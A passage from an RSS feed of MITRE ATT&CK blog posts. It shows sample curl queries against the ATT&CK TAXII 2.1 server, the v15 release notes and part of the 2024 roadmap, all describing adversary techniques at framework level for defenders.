Root, let’s see if we can query for a list of available <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107500">TAXII Collections</a>:</p><pre>curl --request GET \  <br />    --url https://attack-taxii.mitre.org/api/v21/collections/ \  <br />    --header 'Accept: application/taxii+json;version=2.1' </pre><p>The response should look something like the following:</p><pre>{<br />  “collections”: [<br />    {<br />      “id”: “x-mitre-collection — 1f5f1533-f617–4ca8–9ab4–6a02367fa019”,<br />      “title”: “Enterprise ATT&amp;CK”,<br />      “description”: “ATT&amp;CK for Enterprise provides a knowledge base of real-world adversary behavior targeting traditional enterprise networks. ATT&amp;CK for Enterprise covers the following platforms: Windows, macOS, Linux, PRE, Office 365, Google Workspace, IaaS, Network, and Containers.”,<br />      “canRead”: true,<br />      “canWrite”: false,<br />      “mediaTypes”: [<br />        “application/taxii+json;version=2.1”,<br />        “application/taxii+json”<br />      ]<br />    },<br />    {<br />      id”: “x-mitre-collection — 90c00720–636b-4485-b342–8751d232bf09”,<br />      “title”: “ICS ATT&amp;CK”,<br />      …<br />    },<br />    {<br />      “id”: “x-mitre-collection — dac0d2d7–8653–445c-9bff-82f934c1e858”,<br />      “title”: “Mobile ATT&amp;CK”,<br />      …<br />    }<br />  ]<br />}</pre><p>The response lists three objects that match the main ATT&amp;CK domains: Enterprise, Mobile, and ICS. Of note, <em>TAXII Collections</em> and <em>STIX Collections</em> are different concepts — with TAXII Collections operating as versatile containers for CTI objects. For our MITRE ATT&amp;CK TAXII server, we’ve mapped each TAXII Collection directly to an ATT&amp;CK domain. This means querying a TAXII Collection from our server provides data from just one domain, simplifying the user experience and aligning with the ATT&amp;CK framework. While this mapping isn’t required by the TAXII protocol and other servers may organize collections differently, we chose this method to make our server more intuitive for the ATT&amp;CK community.</p><p>Now that we have our API Root and the available TAXII Collections, we’re ready to <a href="https://docs.oasis-open.org/cti/taxii/v2.1/os/taxii-v2.1-os.html#_Toc31107539">retrieve some CTI objects</a>:</p><pre>curl --request GET \<br />  --url 'https://attack-taxii.mitre.org/api/v21/collections/x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858/objects?limit=100' \<br />  --header ‘Accept: application/taxii+json;version=2.1’</pre><p>This request sends a request for the first 100 objects from the Enterprise ATT&amp;CK collection. The response should look something like this:</p><pre>{<br />  “more”: true,<br />  “next”: “1”,<br />  “objects”: [←100 →]<br />}</pre><p>If the ‘more’ property is set to true and the ‘next’ property is populated, then the client can paginate through the remaining records using the ‘next’ URL parameter along with the same original query options. So, we can request the second page of 100 objects by simply adding the ‘next=1’ query parameter to the original request:</p><pre>curl --request GET \  <br />    --url 'https://attack-taxii.mitre.org/api/v21/collections/x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858/objects?limit=100&amp;next=1' \  <br />    --header 'Accept: application/taxii+json;version=2.1' </pre><p><strong>What’s Next for ATT&amp;CK Workbench TAXII 2.1</strong></p><p>We believe the release of the MITRE ATT&amp;CK Workbench TAXII 2.1 server is a big step forward for threat intelligence sharing — and we have even more exciting integrations on our roadmap to make the TAXII experience even smoother:</p><ul><li>Workbench UI indicators that signal whether an object or collection is actively being shared through TAXII;</li><li>Workbench UI toggles that allow users to pause (or enable) the sharing objects and collections with TAXII;</li><li>Workbench role-based access controls (RBAC) for TAXII administration.</li></ul><p>Stay tuned for more updates and enhancements as we continue to evolve our tools!</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00195–2.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=d9fca6ce4c58" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/introducing-taxii-2-1-and-a-fond-farewell-to-taxii-2-0-d9fca6ce4c58">Introducing TAXII 2.1 and a fond farewell to the TAXII 2.0 Server</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-08-22T16:33:32.771Z</pubDate>
</item>
<item>
<title>ATT&amp;CK v15 Brings the Action</title>
<link>https://medium.com/mitre-attack/attack-v15-26685f300acc?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-v15-26685f300acc?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<h3>ATT&amp;CK v15 Brings the Action: Upgraded Detections, New Analytic Format, &amp; Cross-Domain Adversary Insights</h3><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*9nefc6VVPUZWdnO9pxLoTA.png" /></figure><p>v15 is all about actionability and bringing defenders’ reality into focus — we prioritized <em>what </em>you need to detect, and <em>how </em>you can do it more effectively with detection engineering upgrades, and deeper intelligence insights across platforms. This release also reflects the new expansion rhythm, balancing both well-known and emerging behaviors to reflect how trends and activity are experienced in the field.</p><p>For the details on our updates/additions across Techniques, Software, Groups and Campaigns take a look at our <a href="https://attack.mitre.org/resources/updates/updates-april-2024/index.html">release notes</a>, our <a href="https://attack.mitre.org/docs/changelogs/v14.1-v15.0/changelog-detailed.html">detailed changelog</a>, or our <a href="https://attack.mitre.org/docs/changelogs/v14.1-v15.0/changelog.json">changelog.json</a>.</p><h3><strong>Enterprise | Familiar + Novel = Reality</strong></h3><p>With v15 we were aiming for the perfect balance of familiar behaviors you’ve probably seen countless times (e.g., <a href="https://attack.mitre.org/techniques/T1027/013/">T1027.013: Obfuscated Files or Information: Encrypted/ Encoded File</a>, <a href="https://attack.mitre.org/techniques/T1665/">T1665: Hide Infrastructure</a>), as well as newer, emerging trends. The shadowy domain of Resource Development was expanded to illuminate how adversaries are using generative artificial intelligence tools, like large language models (LLMs), to support various malicious activities (<a href="https://attack.mitre.org/techniques/T1588/007/">T1588.007: Obtain Capabilities: Artificial Intelligence</a>). And it’s not just about gaining initial access anymore — we added <a href="https://attack.mitre.org/techniques/T1584/008/">T1584.008: Compromise Infrastructure: Network Devices</a> to capture how threat groups are hacking into third-party network devices, including small office/home office routers, to use these devices to facilitate further targeting.</p><h3><strong>Cloud | More Actionability</strong></h3><p>As outlined in the <a href="/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">ATT&amp;CK 2024 Roadmap</a>, we’re striving to make the <a href="https://attack.mitre.org/matrices/enterprise/cloud/">Cloud matrix</a> more approachable for defenders of all skill levels. With this release, we focused on providing a broader set of defensive measures, resources, and insights for CI/CD pipelines, Infrastructure as Code (IaC), and Identity. v15 features new mitigations and data sources on token protection, along with more specific references to Okta logs. <a href="https://attack.mitre.org/techniques/T1072/">T1072: Software Deployment Tools</a> was expanded to include broad execution of <a href="https://attack.mitre.org/techniques/T1651/">T1651: Cloud Administration Command</a>, reflecting how threat actors are turning cloud native tools like AWS Systems Manager into remote access trojans.</p><p>We ramped up resources for CI/CD pipelines and IaC, and made some refinements to Identity, with the expansion of <a href="https://attack.mitre.org/techniques/T1484/002/">T1484: Domain Policy Modification</a> to include not just Azure AD, but also other identity-as-a-service providers like Okta. <a href="https://attack.mitre.org/techniques/T1556/">T1556: Modify Authentication Process</a> gained a new sub (<a href="https://attack.mitre.org/techniques/T1556/009/">T1556.009: Conditional Access Policies</a>) exploring how threat actors have tampered with or disabled conditional access policies for ongoing access to compromised accounts. We also expanded <a href="https://attack.mitre.org/techniques/T1136/003/">T1136.003: Create Account: Cloud Account</a> with additional service account insights.</p><p><strong>What’s Next:</strong> v16 will feature robust identity and detection updates, as well as the platform rebalancing operations, where we’re focusing on covering a wider range of cloud environments and threats, while making it more intuitive to prioritize techniques relevant to a specific platform.</p><h3><strong>Defensive Coverage | Upgrading, Converting &amp; Restructuring Defensive Measures</strong></h3><p>You’ll find expanded detections in v15 to assist your detection engineering. Previously, we structured our analytics in a pseudo format that was consistent with the Cyber Analytic Repository (CAR). In some cases this was hard to understand.</p><p>In v15, we transformed that format into a real-world query language style (like Splunk) that is compatible with various security tools. These upgrades are featured in detections across the framework including some techniques within the <a href="https://attack.mitre.org/tactics/TA0002/">Execution</a> tactic.</p><p>Our aim with these upgrades, is to reflect the data source itself is the data you should be collecting, and to provide an understandable format that pairs well with every day defender tools (i.e. SIEMs and Sensors).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*TPJCF1m40g_-UQwTjlIjaw.png" /></figure><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*sP0Dsh-4G3EqqmWg77cBFw.png" /></figure><p>We have also synced up some mitigations within the parent to sub-technique relationship. Our team has analyzed a list of sub-techniques that had mitigations that the parent technique did not have. In v15, you will find some parent techniques now reflect what mitigations are seen in the sub-technique.</p><p><strong>What’s Next: </strong>As we gear up for October, we’ll be completing the Execution detections, refining Credential Access detections, diving into Cloud analytics, and restructuring our data sources for better accessibility.</p><h3><strong>ICS | Cross-Domain Campaigns</strong></h3><p>We’ve been working to retrofit major incidents in the ICS space to improve understanding and showcase how ICS and enterprise techniques intersect in each event. V15 illuminates some of the ICS-Enterprise integration efforts, with the release of four cross-mapped campaigns:</p><p>· Starting with <a href="https://attack.mitre.org/campaigns/C0030/">Triton</a>, the Safety Instrumented System attack of 2017 that shook the petrochemical industry to its core.</p><p>· Then there’s <a href="https://attack.mitre.org/campaigns/C0032/">C0032</a>, a campaign spanning various utilities from 2014 to 2017, often grouped with the petrochemical incident but distinctly different in nature.</p><p>· Next up, <a href="https://attack.mitre.org/campaigns/C0031/">Unitronics</a>, a spree that zeroed-in on specific devices and impacted utilities and organizations worldwide. This campaign saw adversaries disrupting device interfaces to make them unusable for end users.</p><p>· Fast forward to <a href="https://attack.mitre.org/campaigns/C0034/">2022 Ukraine Electric Power</a>, where we witnessed a glimpse into the future of ICS attacks, with hypervisor features and shared domain access exploited to infiltrate ICS systems and unleash havoc. The campaign highlights key considerations regarding hypervisor usage across multiple domains, and the abuse of native features in vendor software.</p><p>2022 Ukraine also spawned two new ICS techniques that are featured in this release: <a href="https://attack.mitre.org/techniques/T0895/">T0895: Autorun Image</a> and <a href="https://attack.mitre.org/techniques/T0894/">T0894:System Binary Proxy Execution</a> via vendor application binaries.</p><p><strong>What’s Next: </strong>v16 will launch ICS sub-techniques, along with a structured cross-walk to enable mapping between deprecated and new techniques. We’ll also be releasing new asset coverage and updates on our exploration into incorporating more sectors into the ICS matrix.</p><h3><strong>Mobile | New Techniques, Software, Groups &amp; Mitigations</strong></h3><p>With help from our community, this release incorporates new techniques, including — <a href="https://attack.mitre.org/techniques/T1664/">exploiting software vulnerabilities for initial access </a>and <a href="https://attack.mitre.org/techniques/T1422/">adversaries performing active and automated discovery for the lowdown on your network setup</a> — and incorporated fresh software and groups. We also added a new mitigation to the Mobile matrix, <a href="https://attack.mitre.org/mitigations/M1059/">M1059 Do Not Mitigate</a> (for Mobile) as a sneak peek to the new mitigations that will be added in future releases. This release also features the first Mobile campaign, <a href="https://attack.mitre.org/campaigns/C0033/">C0033</a>, associated with <a href="https://attack.mitre.org/groups/G0056/">PROMETHIUM (G0056)</a>. The group primarily targets Windows devices, however, recent reporting and external contributions demonstrated a shift to mobile exploitation on Android and iOS devices.</p><p>We added in Mobile techniques to existing Groups and Software to illuminate the shift to include mobile exploitation. This includes building out the <a href="https://attack.mitre.org/groups/G0099/">APT-C-23 (G1028)</a> profile, mirroring this South American threat group’s targeting of Android and iOS devices, and recording how <a href="https://attack.mitre.org/groups/G1002/">BITTER (G1002)</a> has distributed malicious apps via SMS, WhatsApp, and various social media platforms.</p><p><strong>What’s Next: </strong>In the coming months, we’ll be rolling out more structured detections, and boosting proactivity across Mobile by evaluating incorporation of pre-intrusion techniques, like active and passive reconnaissance, and acquiring or developing resources for targeting.</p><h3><strong>Cyber Threat Intelligence | More Cybercriminal, Underrepresented Groups</strong></h3><p>We’re working towards better reflecting the threat landscape by infusing the framework with more cybercriminal and underreported adversary activity. This release showcases new cybercriminal operations and highlights <a href="https://attack.mitre.org/groups/G1026/">Malteiro</a>, a criminal group believed to be based in Brazil. They are <a href="https://blog.scilabs.mx/en/cyber-threat-profile-malteiro/">known</a> for operating and distributing the Mispadu/URSA banking trojan through a malware-as-a-service model. Banking trojans, a notorious threat in Latin America, are increasingly spreading their chaos across borders, courtesy of malware developers selling tools to overseas operators. Malteiro’s operations exemplify this targeting shift, evident in a <a href="https://blog.morphisec.com/mispadu-infiltration-beyond-latam">recent campaign</a> affecting European entities across various sectors.</p><p><strong>What’s Next: </strong>We’ll continue conducting thorough assessments of Groups, Software, and Campaigns to up the framework realism quotient and provide clearer insights into adversary activities. We’re also teaming up with ATT&amp;CK domain leads to expand coverage of cross-domain intrusions.</p><h3><strong>Software Dev | TAXII 2.1, FTW</strong></h3><p>We’ve been working towards our goals of enhancing Navigator’s usability and streamlining processes for ATT&amp;CK Workbench. Most importantly, we’re taking our TAXII server to new heights, and by December 18, we’ll be retiring the TAXII 2.0 server and transitioning to the upgraded TAXII 2.1 version. You can locate the documentation for the TAXII 2.1 server in our <a href="http://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a>.</p><p><strong>What’s Next: </strong>We’ll be continuing to<strong> </strong>enhance usability on ATT&amp;CK Workbench and Navigator, and building towards swifter Groups and Software releases. Mark your calendars to update the URLs for TAXII 2.1 clients to connect to <a href="https://attack-taxii.mitre.org/">https://attack-taxii.mitre.org</a> instead of <a href="https://cti-taxii.mitre.org/">https://cti-taxii.mitre.org</a>!</p><h3><strong>In Conclusion | Field Reports, Benefactors</strong></h3><p>We’re always on the lookout for field reports and insights from those of you on the ground. Your observations play a crucial role in improving ATT&amp;CK’s tactical utility — so remember, <em>if you see something, </em><a href="https://attack.mitre.org/resources/engage-with-attack/contribute/"><em>contrib something</em></a>. Curious about how a contribution becomes a technique? Check out <a href="https://youtu.be/v24a5IOwObc?si=C9CZzBThVfLS19zH">our video</a> that walks you through the process.</p><p>If you’re interested in contributing to ATT&amp;CK’s overall autonomy, flexibility, and free services, you can find more details on our <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">Benefactor</a> page. We are deeply grateful to our initial cohort of benefactors, SOC Prime, Tidal Cyber, and Zimperium, for their generous support.</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00779–3.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=26685f300acc" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-v15-26685f300acc">ATT&amp;CK v15 Brings the Action</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-04-23T16:18:30.137Z</pubDate>
</item>
<item>
<title>ATT&amp;CK 2024 Roadmap</title>
<link>https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*NdNL-P_jvIn29chXCd8RmA.jpeg" /></figure><h4>Enhancing usability, expanding scope, optimizing defenses</h4><p>2023 was dynamic year for ATT&amp;CK. We marked a decade of progress since the framework’s inception and achieved some key milestones to make ATT&amp;CK more accessible for a wider community. Our scope (slightly) expanded to encompass activities adjacent to direct Enterprise interactions, such as non-technical, deceptive practices and social engineering techniques (<a href="https://attack.mitre.org/techniques/T1657/">Financial Theft</a>, <a href="https://attack.mitre.org/techniques/T1656/">Impersonation</a>, and <a href="https://attack.mitre.org/techniques/T1598/">Spearphishing Voice</a>). We enhanced detection capabilities with integrated notes, pseudocode from <a href="https://car.mitre.org/">CAR</a>, and <a href="https://github.com/mitre-attack/bzar">BZAR</a>-based analytics. The ICS matrix welcomed the addition of <a href="https://attack.mitre.org/assets/">Assets</a> to enhance inter-sector communication and mapping. We rolled out Mobile-specific <a href="http://attack.mitre.org/datasources/">data sources</a>, structured detections, and behaviors like <a href="https://attack.mitre.org/techniques/T1660/">smishing, quishing, and vishing</a>. Website navigation was improved, along with a faster Search bar, and updates that hit you faster than you can say “<a href="https://attack.mitre.org/resources/changelog.html">resources/changelog.html</a>”. We also maintained a steady cadence of updates and new content from the ATT&amp;CK team and external contributors.</p><p>In October, we successfully held <a href="https://attack.mitre.org/resources/learn-more-about-attack/attackcon/october-2023/">ATT&amp;CKcon 4.0</a>, with new insights shared and realistic applications demonstrated by practitioners. And finally, we kickstarted the <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">ATT&amp;CK Benefactor program</a>.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*BMDwDsQqdUFRS-B-t7MyTA.jpeg" /><figcaption>ATT&amp;CKcon 4.0 Themed Snacks</figcaption></figure><h3><strong>2024 Roadmap: Vision &amp; Goals</strong></h3><p>Since launching ATT&amp;CK, we’ve been humbled to witness how the community has integrated it across widely varied spheres and around the globe. The vision for ATT&amp;CK has always been to enable the broadest use across the widest spectrum of stakeholders — whether you’re cross-mapping between domains, annotating and developing tailored Navigator layers, or using the framework as a blueprint to build multi-platform threat models. ATT&amp;CK was designed to empower defenders precisely where they need it most. This is the core thesis for ATT&amp;CK, and as its stewards, we’ll continue prioritizing measures that advance a more inclusive, relevant, and actionable framework.</p><p>In line with this vision, our 2024 goals are to bolster broader usability and enhance actionable defensive measures for practitioners across every domain. This includes exploring scope adjustments and platform rebalancing, as well as implementing structural modifications with the introduction of ICS sub-techniques. A core focus will be reinforcing defensive mechanisms and optimizing their user-friendliness. We’ll be bridging Linux and macOS information gaps and enhancing prominent adversary representation. The ATT&amp;CK Navigator, Workbench, and website will feature reengineering to improve accessibility and enable swifter ATT&amp;CK Group/Software/Campaign updates. We’ll also be sunsetting the TAXII 2.0 server by December 18 in favor of the upgraded TAXII 2.1 version. Finally, we’ll continue amplifying the key driver behind ATT&amp;CK — community collaboration. This includes hosting ATT&amp;CKcon 5.0 in October, and maintaining support for the <a href="https://www.attack-community.org">European Union (EU)</a> and <a href="https://na.eventscloud.com/website/67610/">Asia-Pacific (APAC) ATT&amp;CK Community</a> Workshops.</p><h3><strong>Enterprise | Integrated Defense</strong></h3><p>In tune with ATT&amp;CK’s vision, we’re continuously re-evaluating Enterprise’s scope to more accurately reflect the threats faced by real defenders. Matrices and platforms are conceptual schematics, not real-world structures, and we’re assessing realignments, expansions, and refinements of platforms to represent interconnected organizations, the adversaries they encounter, and the reality of defenders. Our goal is to advance a cohesive and integrated framework that provides more functional use cases and empowers users to visualize and create adaptable defenses against cross-platform threats.</p><p><strong>Cloud | Matrix Balance &amp; More Actionability</strong></p><p>Our Cloud goal this year is to enable defenders (both new and seasoned) to better leverage the Cloud matrix for defensive action. This includes focusing on emerging and significant threats to the domain, upgrading Cloud analytics, and optimizing the balance between generalization and detail in the matrix.</p><p>With a considerable portion of cloud identities retaining super admin access, and the frequency of identity-related intrusions across the domain, we’ve been reinforcing and creating more detailed techniques for identity-based attacks. We’ll also be diving into the exploitation of Continuous Integration/Continuous Deployment (CI/CD) pipelines and the malicious use of Infrastructure as Code (IaC). Our Cloud analytics effort will elevate your actionability, by outlining the steps to detect specific behaviors, and providing additional context on what to find and collect.</p><p>We’ll also be evaluating how to best refine the balance between abstraction and specificity in the matrix. Our exploration will assess if the platforms are broad enough to cover a wide range of cloud environments and threats, yet specific enough to inform defensive actions. This balance is crucial for the matrix to remain practical and useful for defenders operating in diverse cloud environments. Our aim is to make navigating the Cloud matrix more intuitive and enable users to prioritize techniques relevant to their specific platform.</p><p>Ready to navigate the Cloud with us? Sail over to #<a href="https://mitreattack.slack.com/archives/C035Z0AL8R0"><strong>cloud_attack</strong></a>.</p><p><strong>macOS/Linux | Countermeasures for Priv Esc and Defense Evasion</strong></p><p>Our goal for Linux and macOS is to equip practitioners with more robust countermeasures and help bridge the information gap on defending these systems. We’ll continue tracking down in-the-wild adversary behaviors and building more macOS and Linux-only (sub)techniques to optimize defensive arsenals. For Linux we’ll be exploring privilege escalation and defense evasion to better align with in-the-wild adversary activity. On the macOS side, we’ll be strategically bolstering the platform, with a particular emphasis on threats associated with elevated permissions.</p><p>If you have intelligence or technique ideas, we would love to collaborate. We rely on the practitioners who work with these systems day-in and day-out to help us identify gaps and provide invaluable insights. Ready to contribute? <a href="http://attack@mitre.org/">email us</a> and join our <strong>#</strong><a href="https://mitreattack.slack.com/archives/C035BUEMMHP"><strong>linux_attack</strong></a> or <a href="https://mitreattack.slack.com/archives/C0351D4AU1J"><strong>#macos_attack</strong></a> slack channel.</p><h3><strong>Defensive Coverage | Upgrading, Converting &amp; Restructuring Defensive Measures</strong></h3><p>Our Defensive goal this year is to expand detections and mitigations to help you better optimize your detection engineering — and maybe get a little more actionable. The April release will include both new and updated mitigations that incorporate best practices from contributors, and industry standards meticulously mapped by our defense team.</p><p>Over the past few months, we’ve also been examining analytic language approaches. Our aim? Transforming detection logic into formats compatible with different security tools, including more consistent with real-world query languages such as Splunk . This will simplify the process of aligning your SIEM data with ATT&amp;CK detections, making it easier to understand. We’re also incorporating data collection sources for a given detection query. For example, pulling information from Windows Event logs or Sysmon and the associated Event Code. The new analytic style in ATT&amp;CK will overhal the previously used CAR-like pseudocode, and will be the model for future analytics. This will enhance compatibility across various environments and help you hunt threats more efficiently.</p><p>Lately, we’ve been prioritizing improving detections under the Execution tactic, where some of the most employed techniques fall. v15 will showcase a subset of these enhanced detections, featuring the trifecta of <a href="https://car.mitre.org/">CAR</a> (Cyber Analytics Repository) pseudocode, <a href="https://github.com/mitre-attack/bzar">BZAR</a>-based analytics (Bro/Zeek ATT&amp;CK-based Analytics and Reporting) and detection notes.</p><p>Gearing up for October, we’ll be completing the enhanced detections for Execution, sculpting out Credential Access detections, exploring the universe of Cloud analytics, and navigating how to restructure our data sources for improved accessibility. This means sprucing up data source definitions and matching them to everyday use cases like sensor mappings. This way, you can more easily identify the tools and events that clue you in on shady activity. Additionally, you can opt for the data sources that best align with your specific needs. The revamp will also include the introduction of STIX IDs for data components, making it more intuitive to reference and integrate data sources.</p><p>Join our ranks at <a href="https://mitreattack.slack.com/archives/C036RA0B7EX"><strong>#defensive_attack</strong></a> channel.</p><h3><strong>ICS | Subs, Asset Expansion, &amp; Cross-Domain Integration</strong></h3><p>ICS is leveling up this year. Our goals include broadening ICS horizons with new asset coverage, exploring platform scope expansion, and continuing our multi-domain integration quest. We’ll also be diving deeper into adversary behaviors with the introduction of sub-techniques. v15 will showcase some of integration efforts, with the release of cross-mapped campaigns. These campaigns track IT to OT attack sequences, helping defenders better understand multi-domain intrusions and informing unified defense strategies across technology environments.</p><p>The October release will feature a structural shake-up, with the first tranche of the long-awaited sub-techniques. Like Enterprise and Mobile sub-techniques, ICS subs will break down techniques into more detail. This increased granularity allows defenders to understand the nuances of adversaries’ execution of a given technique, enhancing their ability to detect and mitigate them. The technique restructuring will involve modifying the name and scope of techniques and integrating them more effectively with other domains. This integration will foster a more comprehensive defensive approach on both the right and left of launch. You can expect a subs crosswalk to help you understand our decisions and how things map between deprecated and new techniques.</p><p>October will also include some additional treats with Asset coverage expansion, building upon the <a href="https://medium.com/mitre-attack/attack-v14-fa473603f86b">Asset refactoring in v14</a>. The refactoring strived to provide a clearer picture of the devices, systems, or platforms a specific technique could target and introduced the concept of Related Assets. Related Assets links cross-sector Assets that share similar functions, capabilities, and architectural locations/properties, highlighting that they may also be susceptible to the same techniques. v16 will feature additional Related Assets, as well as more in-depth definitions and refined mappings of technique relationships for different devices and systems. You can start leveraging Assets for your defensive activities by viewing the technique mappings from <a href="https://attack.mitre.org/assets/">Asset</a> pages, or by reviewing Asset mappings from a technique page. We’ll also be scouting how to incorporate additional sectors such as such as maritime, rail, and electric.</p><p>We welcome input from all sectors on how to improve identification of key assets and any additional adversary behaviors you have observed in the wild. Reach out to us at <a href="mailto:attack@mitre.org">attack@mitre.org</a> or <strong>#</strong><a href="https://mitreattack.slack.com/archives/C061YMN07M1"><strong>ics_attack</strong></a></p><h3><strong>Mobile | Detections &amp; Mitigations Optimization + PRE Exploration</strong></h3><p>Mobile’s goal is to dial up the pre-and-post-compromise defensive measures this year, with a detections and mitigations upgrade and an exploratory mission into pre-intrusion behaviors for the matrix. We introduced Mobile structured detections in v14 and will continue building out structured detections as well as expanding our mitigations across the matrix. For optimal actionability, we’ll be leveraging the best practices and tangible experiences from the mobile security community.</p><p>In the coming months we’ll also be evaluating how to enhance inter-domain connectivity across platforms and exploring integrating proactive tactics into the Mobile matrix. Our goal is to better reflect evolving adversary activity targeting the domain. This research quest will examine adversary actions before attacks, like active and passive <a href="https://attack.mitre.org/tactics/TA0043/">Reconnaissance</a>, and <a href="https://attack.mitre.org/tactics/TA0042/">acquiring or developing resources</a> for targeting purposes.</p><p>Collaboration and knowledge-sharing with the community will to be a driver for Mobile’s development in 2024. In addition to ramping up detections and mitigations, we’re particularly interested in partnering with mobile defenders to examine potential areas where communications platforms or domains could be added into ATT&amp;CK. If you’re interested, connect via <a href="mailto:attack@mitre.org">attack@mitre.org</a> or join <strong>#</strong><a href="https://mitreattack.slack.com/archives/C036CEG4VRP"><strong>mobile_attack</strong></a><strong>.</strong></p><h3><strong>Software Development | Enhanced Usability &amp; Streamlined Workflows</strong></h3><p>Our Software goals this year are to increase usability across ATT&amp;CK Workbench and Navigator, and streamline Groups and Software releases. Adversaries evolve quickly, so we’re optimizing Workbench workflows to harmonize Group and Software releases more closely to their cadence. This includes developing enhanced search capabilities, improving ATT&amp;CK object-collection association, and overhauling the Collection Manager UI for the ATT&amp;CK Workbench. These renovations will fine-tune the approval of ATT&amp;CK object changes and the matching of collection bundle differences with official ATT&amp;CK changelog types, resulting in swifter releases.</p><p>For ATT&amp;CK Navigator, we’re refining the user experience, <em>and</em> the experience of anyone reading your reports. We’ll be upgrading SVG export function for sleeker output designs, providing smoother navigation with intuitive export controls, and rolling out an in-website tutorial for mastery of all the key features. We’ll also be updating the official content source to the STIX 2.1 repository — making everything a little more robust and flexible.</p><p>Finally, we’re taking our TAXII server to the next level! We’ll be sunsetting the TAXII 2.0 server by December 18, as we transition to the upgraded TAXII 2.1 version. You can access the documentation for TAXII 2.1 server in our <a href="http://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a>. Remember to switch URLs for TAXII 2.1 clients to connect to <a href="https://attack-taxii.mitre.org">https://attack-taxii.mitre.org</a> instead of <a href="https://cti-taxii.mitre.org.">https://cti-taxii.mitre.org.</a> And get ready to experience enhanced features and smoother operations.</p><h3><strong>Cyber Threat Intelligence | More Cybercriminal, Underrepresented Groups</strong></h3><p>With CTI, our mission is to better reflect the reality of the threat landscape by infusing more cybercriminal and underreported adversary activity into the framework. By bridging gaps in representation and minimizing those unknowns, we aim to provide defenders with better insights and tools to counter a wider array of threats. A pivotal aspect of this effort includes gap assessments of Groups, Software, and Campaigns. These evaluations will help us pinpoint any disparities between the current content and the reality of adversary activities.</p><p>Our releases this year will feature more cybercriminal operations and under-monitored regions, including Latin America, offering a more nuanced understanding of global threats. We’re also collaborating with ATT&amp;CK domain leads to expand coverage of cross-domain intrusions to inform a more unified approach to undermining adversaries.</p><p>To join this quest, engage at <a href="mailto:attack@mitre.org">attack@mitre.org</a></p><h3><strong>Community Collaboration</strong></h3><p><strong>ATT&amp;CK Community Workshops | Practitioner-led Forums for Activating ATT&amp;CK</strong></p><p>We’re always inspired to see how ATT&amp;CK is being used in innovative ways to upgrade defensive capabilities. The regional ATT&amp;CK community workshops — organized by practitioners, for practitioners — provide forums to share insights, use cases, and collaborative approaches for leveraging ATT&amp;CK.</p><ul><li>The <a href="https://www.attack-community.org/event/">European Union (EU)</a> ATT&amp;CK Community workshop, hosted by the <a href="https://ccb.belgium.be/en">Centre for Cybersecurity Belgium </a>and supported by the <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/">Center for Threat-Informed Defense (CTID)</a> was the first regional ATT&amp;CK workshop, The 2024 iteration will take place in Brussels, Belgium on May 17, in-person and virtually.</li><li>The <a href="https://na.eventscloud.com/website/67610/">Asia-Pacific (APAC) ATT&amp;CK Community Workshop</a>, hosted by the by the <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/">CTID</a>, launches this April 25–26 in Singapore, and <a href="https://na.eventscloud.com/esurvey/index.php?surveyid=119679&amp;st=11ed3b2537a57f262963e9006f1f47b114c68f6f">virtual attendance</a> is still open. The Workshop will advance threat-informed defense through hands-on training, ATT&amp;CK best practices, worst practices, and moonshot approaches.</li></ul><p><strong>ATT&amp;CKcon 5.0 | Great Speakers, Content, &amp; Conversations around ATT&amp;CK</strong></p><p><strong>ATT&amp;CKcon 5.0 </strong>will be arriving October 22–23, featuring both virtual and in-person attendance from McLean, VA. Stay tuned to our Twitter and LinkedIn channels for updates on our Call for Presentations, which will open in the coming months, followed by our illustrious speaker lineup. If your organization is thinking about joining the ATT&amp;CKcon adventure as a sponsor, please reach out to us at attackcon@mitre.org.</p><p><strong>Benefactor Program | Empowering Defenders, Sustaining Independence</strong></p><p>We want to take a moment to share some insights into the foundational tenants and financial realities of ATT&amp;CK. Much like we crowd-source intelligence and rely on community contributions, ATT&amp;CK itself was built to be independent, responsive, and part of the global community.</p><p>From the outset, we deliberately chose not to align ATT&amp;CK with any specific government department or agency. This decision was made to maintain autonomy, flexibility, and to foster collaboration across the broadest spectrum of stakeholders. While this approach has facilitated agility and international partnerships, it also means that ATT&amp;CK lacks a dedicated funding source.</p><p>To bridge this funding gap and ensure the continuity of our operations, as well as expanding into new domains, we launched the <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">Benefactor Program</a> last year. This program enables tax-deductible, charitable donations from individuals and organizations who believe in ATT&amp;CK’s mission. These contributions allow 